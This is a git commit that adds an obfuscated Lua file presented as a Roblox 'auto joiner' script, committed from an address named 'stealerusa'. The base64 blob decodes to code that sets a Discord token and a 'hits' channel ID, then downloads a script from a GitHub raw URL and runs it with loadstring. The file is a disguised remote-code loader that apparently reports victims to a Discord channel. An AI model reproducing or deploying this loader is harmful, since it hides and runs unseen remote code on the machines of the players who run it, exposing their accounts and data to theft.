69908dff493200123138a2ce511c52fe0011ce5a
gayasf518 <stealerusa@gmail.com>
2025-08-16 10:25:38 -0700

    Auto joiner script

---
+++ autojoiner-ad3a608d.lua
@@ -0,0 +1,32 @@
+local _7e28df68 = {}
+_7e28df68[1] = "X0cuRElTQ09SRF9UT0tFTiA9ICJqYWNrY29vbGFuaTY5IgpfRy"; _7e28df68[2] = "5ISVRTX0NIQU5ORUxfSUQgPSAiMTQwNjI5ODY1NTY2ODgzMDM3"; _7e28df68[3] = "OCIKCmlmIG5vdCBfRy5ISVRTX0NIQU5ORUxfSUQgb3IgX0cuSE"; _7e28df68[4] = "lUU19DSEFOTkVMX0lEID09ICJZT1VSX0hJVFNfQ0hBTk5FTF9J"; _7e28df68[5] = "RF9IRVJFIiB0aGVuCiAgICBsb2NhbCBDb3JlR3VpID0gZ2FtZT"; _7e28df68[6] = "pHZXRTZXJ2aWNlKCJDb3JlR3VpIikKICAgIGxvY2FsIGd1aSA9"; _7e28df68[7] = "IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgIGxvY2FsIG"; _7e28df68[8] = "ZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBsb2Nh"; _7e28df68[9] = "bCB0aXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKIC"; _7e28df68[10] = "AgIGxvY2FsIG1lc3NhZ2UgPSBJbnN0YW5jZS5uZXcoIlRleHRM"; _7e28df68[11] = "YWJlbCIpCiAgICBsb2NhbCBjbG9zZUJ0biA9IEluc3RhbmNlLm"; _7e28df68[12] = "5ldygiVGV4dEJ1dHRvbiIpCiAgICAKICAgIGd1aS5OYW1lID0g"; _7e28df68[13] = "IkNvbmZpZ1dhcm5pbmciCiAgICBndWkuUGFyZW50ID0gQ29yZU"; _7e28df68[14] = "d1aQogICAgCiAgICBmcmFtZS5QYXJlbnQgPSBndWkKICAgIGZy"; _7e28df68[15] = "YW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQi"; _7e28df68[16] = "g0MCwgNDAsIDQwKQogICAgZnJhbWUuUG9zaXRpb24gPSBVRGlt"; _7e28df68[17] = "Mi5uZXcoMC41LCAtMjAwLCAwLjUsIC0xMDApCiAgICBmcmFtZS"; _7e28df68[18] = "5TaXplID0gVURpbTIubmV3KDAsIDQwMCwgMCwgMjAwKQogICAg"; _7e28df68[19] = "ZnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMgogICAgZnJhbWUuQm"; _7e28df68[20] = "9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAw"; _7e28df68[21] = "KQogICAgCiAgICB0aXRsZS5QYXJlbnQgPSBmcmFtZQogICAgdG"; _7e28df68[22] = "l0bGUuVGV4dCA9ICLimqDvuI8gQ09ORklHVVJBVElPTiBSRVFV"; _7e28df68[23] = "SVJFRCDimqDvuI8iCiAgICB0aXRsZS5Gb250ID0gRW51bS5Gb2"; _7e28df68[24] = "50LlNvdXJjZVNhbnNCb2xkCiAgICB0aXRsZS5UZXh0U2l6ZSA9"; _7e28df68[25] = "IDE4CiAgICB0aXRsZS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb2"; _7e28df68[26] = "1SR0IoMjU1LCAxMDAsIDEwMCkKICAgIHRpdGxlLkJhY2tncm91"; _7e28df68[27] = "bmRUcmFuc3BhcmVuY3kgPSAxCiAgICB0aXRsZS5TaXplID0gVU"; _7e28df68[28] = "RpbTIubmV3KDEsIDAsIDAsIDQwKQogICAgdGl0bGUuUG9zaXRp"; _7e28df68[29] = "b24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMTApCiAgICAKICAgIG"; _7e28df68[30] = "1lc3NhZ2UuUGFyZW50ID0gZnJhbWUKICAgIG1lc3NhZ2UuVGV4"; _7e28df68[31] = "dCA9ICJZb3UgbmVlZCB0byBzZXQgeW91ciBISVRTX0NIQU5ORU"; _7e28df68[32] = "xfSUQgaW4gdGhlIGxvYWRlciFcblxuRmluZCBsaW5lOiBfRy5I"; _7e28df68[33] = "SVRTX0NIQU5ORUxfSUQgPSBcIllPVVJfSElUU19DSEFOTkVMX0"; _7e28df68[34] = "lEX0hFUkVcIlxuUmVwbGFjZSB3aXRoIHlvdXIgRGlzY29yZCBj"; _7e28df68[35] = "aGFubmVsIElEXG5cbkV4YW1wbGU6IF9HLkhJVFNfQ0hBTk5FTF"; _7e28df68[36] = "9JRCA9IFwiMTIzNDU2Nzg5MDEyMzQ1Njc4OVwiIgogICAgbWVz"; _7e28df68[37] = "c2FnZS5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKICAgIG"; _7e28df68[38] = "1lc3NhZ2UuVGV4dFNpemUgPSAxNAogICAgbWVzc2FnZS5UZXh0"; _7e28df68[39] = "Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQogICAgbWVzc2"; _7e28df68[40] = "FnZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgbWVz"; _7e28df68[41] = "c2FnZS5TaXplID0gVURpbTIubmV3KDEsIC0yMCwgMCwgMTIwKQ"; _7e28df68[42] = "ogICAgbWVzc2FnZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAx"; _7e28df68[43] = "MCwgMCwgNTApCiAgICBtZXNzYWdlLlRleHRXcmFwcGVkID0gdH"; _7e28df68[44] = "J1ZQogICAgbWVzc2FnZS5UZXh0WUFsaWdubWVudCA9IEVudW0u"; _7e28df68[45] = "VGV4dFlBbGlnbm1lbnQuVG9wCiAgICAKICAgIGNsb3NlQnRuLl"; _7e28df68[46] = "BhcmVudCA9IGZyYW1lCiAgICBjbG9zZUJ0bi5UZXh0ID0gIkNs"; _7e28df68[47] = "b3NlIgogICAgY2xvc2VCdG4uRm9udCA9IEVudW0uRm9udC5Tb3"; _7e28df68[48] = "VyY2VTYW5zCiAgICBjbG9zZUJ0bi5UZXh0U2l6ZSA9IDE2CiAg"; _7e28df68[49] = "ICBjbG9zZUJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLm"; _7e28df68[50] = "Zyb21SR0IoMTIwLCA0MCwgNDApCiAgICBjbG9zZUJ0bi5UZXh0"; _7e28df68[51] = "Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQogICAgY2xvc2"; _7e28df68[52] = "VCdG4uUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtNTAsIDEs"; _7e28df68[53] = "IC00MCkKICAgIGNsb3NlQnRuLlNpemUgPSBVRGltMi5uZXcoMC"; _7e28df68[54] = "wgMTAwLCAwLCAzMCkKICAgIAogICAgY2xvc2VCdG4uTW91c2VC"; _7e28df68[55] = "dXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgIC"; _7e28df68[56] = "AgZ3VpOkRlc3Ryb3koKQogICAgZW5kKQogICAgCiAgICByZXR1"; _7e28df68[57] = "cm4KZW5kCgpsb2NhbCBzY3JpcHRfdXJsID0gImh0dHBzOi8vcm"; _7e28df68[58] = "F3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9EdXBlTmV3L2JvdC9y"; _7e28df68[59] = "ZWZzL2hlYWRzL21haW4vc2ltcGxlX2F1dG9qb2luZXIiCmxvYW"; _7e28df68[60] = "RzdHJpbmcoZ2FtZTpIdHRwR2V0KHNjcmlwdF91cmwpKSgp"
+local _e72c9ff1 = ""
+for i = 1, #_7e28df68 do
+    _e72c9ff1 = _e72c9ff1 .. (_7e28df68[i] or "")
+end
+local _a9618f85 = ""
+local _75bc994f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+for i = 1, #_e72c9ff1, 4 do
+    local _0c75f369 = _e72c9ff1:sub(i, i+3)
+    local _8ec03baa = 0
+    for j = 1, #_0c75f369 do
+        local _9726357c = _75bc994f:find(_0c75f369:sub(j,j))
+        if _9726357c then
+            _9726357c = _9726357c - 1
+            _8ec03baa = _8ec03baa + _9726357c * (64 ^ (4-j))
+        end
+    end
+    for j = 1, 3 do
+        if i + j - 1 <= #_e72c9ff1 then
+            _a9618f85 = _a9618f85 .. string.char(math.floor(_8ec03baa / (256 ^ (3-j))) % 256)
+        end
+    end
+end
+local _82f9da2d = ""
+local _counter = 1
+while _counter <= #_a9618f85 do
+    local _byte = _a9618f85:byte(_counter)
+    _82f9da2d = _82f9da2d .. string.char(_byte)
+    _counter = _counter + 1
+end
+loadstring(_82f9da2d)()
